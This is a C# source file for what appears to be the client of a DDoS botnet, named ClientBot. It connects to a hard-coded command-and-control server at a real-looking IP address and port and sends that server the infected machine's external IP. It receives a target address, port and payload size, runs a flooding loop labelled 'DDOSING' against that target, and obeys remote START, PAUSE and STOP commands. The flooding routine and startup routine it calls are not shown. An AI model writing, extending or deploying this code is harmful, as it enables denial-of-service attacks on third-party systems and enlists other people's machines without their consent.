using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using Microsoft.Win32;


namespace ClientBot
{
    class Client
    {
        static IPAddress host = IPAddress.Parse("142.129.157.81");
        static int port = 22580;
        static IPAddress client;
        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static TcpClient hostServer = new TcpClient();
        static TcpListener listener = new TcpListener(host, port);
        static bool stop = false;
        static bool pause = false;
        static bool start = true;
        static void Main(string[] args)
        {
            if (ClientBot.Initializer.startUp() == true)
            {
                Console.Write("IP " + getIP());
                client = getIP();
                Connect();
            }
        }
        static void Connect()
        {
            socket.Blocking = true;
            try
            {
                hostServer.Client.Connect(host, port);
                Console.WriteLine("\n it worked ");
                Listen();
                
            }
            catch(SocketException e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error: " + e.ToString());
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("reconnecting in 10 seconds");
                Thread.Sleep(10000);
                Connect();
            }
           

        }
        static void Listen()
        {
            //byte[] received = new byte[200];
            // listener.Start();
            // TcpClient tcp = listener.AcceptTcpClient();
            // NetworkStream stream = tcp.GetStream();
            //  string recieve = stream.Read(received,0,received.Length).ToString();
            // Console.WriteLine(recieve);
            //
            try
            {
                int i = 0;
                char[] delimiter = { '$',' '};
                byte[] data = new byte[1024];
                NetworkStream stream = hostServer.GetStream();
                int recievedData = stream.Read(data, 0, data.Length);
                string StrData = Encoding.ASCII.GetString(data, 0, recievedData);
                string[] info = StrData.Split(delimiter);
                IPAddress sentIP = IPAddress.Parse(info[0]);
                int sentPort = int.Parse(info[1]);
                int sentData = int.Parse(info[2]);
                Console.WriteLine(StrData);
                sendSpeed();
                Task.Run(() =>
                {
                    while (!stop)
                    {
                        read();
                    }
                });
                while(ClientBot.DDOS.sendData(sentIP,sentPort,sentData,"hello there"))
                {
                    if (!stop)
                    {
                        i++;
                        Console.Write("\r DDOSING iteration:{0} ", i);
                    }
                    else if(stop)
                    {
                        Console.WriteLine("Breaking Out");
                        break;
                    }
                }
                if(ClientBot.DDOS.sendData(sentIP, sentPort, sentData, "hello there"))
                {
                    if(stop)
                    {
                        Console.WriteLine("Stop Command Recieved");
                    }
                    Console.WriteLine("Shit broken");
                }
                Console.WriteLine("Press any key to exit");
                Console.ReadKey();
            }
            catch(Exception e)
            {
                Console.WriteLine("shit happens " + e);
            }
        }
        static string read()
        {
            string commandStop = Command.STOP.ToString();
            string commandPause = Command.PAUSE.ToString();
            string commandStart = Command.START.ToString();
            string ret;
            NetworkStream stream = hostServer.GetStream();
            byte[] data = new byte[1024];
            int receivedData = stream.Read(data, 0, data.Length);
            ret = Encoding.ASCII.GetString(data,0,receivedData);
            
            if(ret.Equals(commandStop))
            {
                Console.WriteLine("Command received "+ret);
                stop = true;
                pause = false;
                start = false;
            }
            else if(ret.Equals(commandPause))
            {
                Console.WriteLine("Command received " + ret);
                stop = false;
                pause = true;
                start = false;
            }
            else if(ret.Equals(commandStart))
            {
                Console.WriteLine("Command received " + ret);
                stop = false;
                pause = false;
                start = true;
            }
                return ret;
        }
        static IPAddress getIP()
        {
            IPAddress ip;
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                             .Matches(externalIP)[0].ToString();
                ip = IPAddress.Parse(externalIP);
                return ip;
            }
            catch { return null; }


        }
        static double getSpeed()
        {
            double speed = 10;
            /*  Uri URL = new Uri("http://sixhoej.net/speedtest/1024kb.txt");
              WebClient wc = new WebClient();
              double starttime = Environment.TickCount;
              // download file from the specified URL, and save it to C:\speedtest.txt  
              wc.DownloadFile(URL, @"C:\Users\winga\Documents\speedtest.txt");
              // get current tickcount  
              double endtime = Environment.TickCount;
              // how many seconds did it take?  
              // we are calculating this by subtracting starttime from endtime  
              // and dividing by 1000 (since the tickcount is in miliseconds.. 1000 ms = 1 sec)  
              double secs = Math.Floor(endtime - starttime) / 1000;
              // round the number of secs and remove the decimal point  
              double secs2 = Math.Round(secs, 0);
              // calculate download rate in kb per sec.  
              // this is done by dividing 1024 by the number of seconds it  
              // took to download the file (1024 bytes = 1 kilobyte)  
              double kbsec = Math.Round(1024 / secs);
              try
              {
                  // delete downloaded file  
                  System.IO.File.Delete(@"C:\Users\winga\Documents\speedtest.txt");
              }
              catch
              {

              }*/
            speed++;
            return speed;
        }
        static void sendSpeed()
        {
            NetworkStream stream = hostServer.GetStream();
            string ip = getIP().ToString();
            double speed = getSpeed();
            string toSend = ip +"$"+ speed;
            stream.Write(Encoding.ASCII.GetBytes(toSend), 0, Encoding.ASCII.GetBytes(toSend).Length);
        }
    } 
    public enum Command
    {
        START,
        PAUSE,
        STOP
    }
}

